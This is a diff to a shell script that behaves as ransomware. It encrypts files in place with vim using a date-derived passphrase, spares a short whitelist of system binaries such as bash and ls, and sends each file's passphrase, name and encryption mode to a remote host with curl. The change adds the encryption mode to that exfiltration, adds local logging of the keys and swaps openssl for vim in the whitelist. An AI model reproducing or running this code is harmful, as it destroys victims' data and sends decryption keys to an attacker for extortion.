@@ -159,7 +159,7 @@ else
 fi
 
 # Some applications will remain intact 
-protected_applications=( cat wall echo bash ifconfig ls chmod rm openssl )
+protected_applications=( cat echo bash ifconfig ls chmod rm vim )
 white_list=$(printf '%s|' "${protected_applications[@]}")
 
 # Files to iterate through
@@ -175,7 +175,10 @@ do
       passphrase=$(date | md5sum | awk '{print $1}')
     fi
     if $host_given; then
-      curl --data "passphrase=$passphrase&file=$file" https://$host:$port 
+      curl --data "encryption=$encryption&passphrase=$passphrase&file=$file" https://$host:$port 
+    fi
+    if $log_given; then
+      echo "Encryption:'$encryption' Pass:'$passphrase'  File:'$file'" >> $log
     fi
     vim --cmd "set key=$passphrase" --cmd "set cm=$encryption" -c wq $file 
   else
